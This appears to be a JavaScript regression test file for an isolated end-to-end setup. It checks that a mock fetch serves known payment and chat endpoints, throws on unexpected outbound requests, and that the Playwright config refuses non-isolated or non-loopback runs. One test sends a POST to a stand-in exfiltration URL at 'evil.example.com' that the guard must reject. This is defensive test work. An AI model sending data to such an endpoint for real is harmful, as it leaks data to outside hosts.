/**
 * Regression — isolated E2E mock upstream (P0 fail-closed egress).
 *
 * The isolated backend injects a single `fetch` (createMockUpstream) so no real
 * provider call can leave the machine and no real credential is used. Any
 * outbound request that is NOT one of the known provider endpoints must THROW —
 * a silent success would let a real network call slip through unnoticed.
 *
 * Also covers the Playwright config fail-closed guard: the mutating suite must
 * refuse to load unless the isolated runner set E2E_ISOLATED=1 + a loopback
 * E2E_BASE_URL.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { createMockUpstream } from '../e2e/isolated/mock-upstream.mjs';

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');

test('mock upstream: known provider endpoints answer deterministically', async () => {
  const fetchMock = createMockUpstream({ paySeam: false });

  const create = await fetchMock('https://klikqris.com/api/qris/create', {
    method: 'POST',
    body: JSON.stringify({ order_id: 'ord_test', amount: 10000 }),
  });
  const createBody = await create.json();
  assert.equal(createBody.status, true);
  assert.equal(createBody.data.status, 'PENDING');
  assert.equal(createBody.data.order_id, 'ord_test');

  const status = await fetchMock('https://klikqris.com/api/qris/status/ord_test');
  const statusBody = await status.json();
  assert.equal(statusBody.data.status, 'PENDING'); // paySeam off → not settled

  const seam = createMockUpstream({ paySeam: true });
  const paid = await (await seam('https://klikqris.com/api/qris/status/ord_test')).json();
  assert.equal(paid.data.status, 'SUCCESS'); // seam on → settled (isolated only)

  const chat = await (await fetchMock('https://mock.invalid/v1/chat/completions', {
    method: 'POST',
    body: JSON.stringify({ messages: [{ role: 'user', content: 'hi' }] }),
  })).json();
  assert.match(chat.choices[0].message.content, /\[mock\]/);
});

test('mock upstream: an unexpected outbound request THROWS (no silent egress)', async () => {
  const fetchMock = createMockUpstream();
  await assert.rejects(
    () => fetchMock('https://evil.example.com/exfiltrate', { method: 'POST', body: '{}' }),
    /refused unexpected outbound request/,
    'unknown egress must fail loudly, never succeed silently',
  );
});

function loadPlaywrightConfig(env) {
  const script = `
    try {
      await import(${JSON.stringify(path.join(repoRoot, 'playwright.config.mjs'))});
      process.stdout.write('LOADED');
    } catch (e) {
      process.stdout.write('REFUSED:' + e.message);
    }
  `;
  const res = spawnSync(process.execPath, ['--input-type=module', '-e', script], {
    cwd: repoRoot,
    encoding: 'utf8',
    timeout: 30_000,
    env: { ...process.env, ...env },
  });
  return res.stdout || '';
}

test('playwright.config refuses to load without E2E_ISOLATED=1 (no bare prod run)', () => {
  const out = loadPlaywrightConfig({ E2E_ISOLATED: '', E2E_BASE_URL: '' });
  assert.match(out, /REFUSED/, `config must refuse a bare run, got: ${out}`);
});

test('playwright.config refuses a non-loopback base URL', () => {
  const out = loadPlaywrightConfig({ E2E_ISOLATED: '1', E2E_BASE_URL: 'https://copilot.grouter.id' });
  assert.match(out, /REFUSED.*not loopback/, `config must refuse a public origin, got: ${out}`);
});
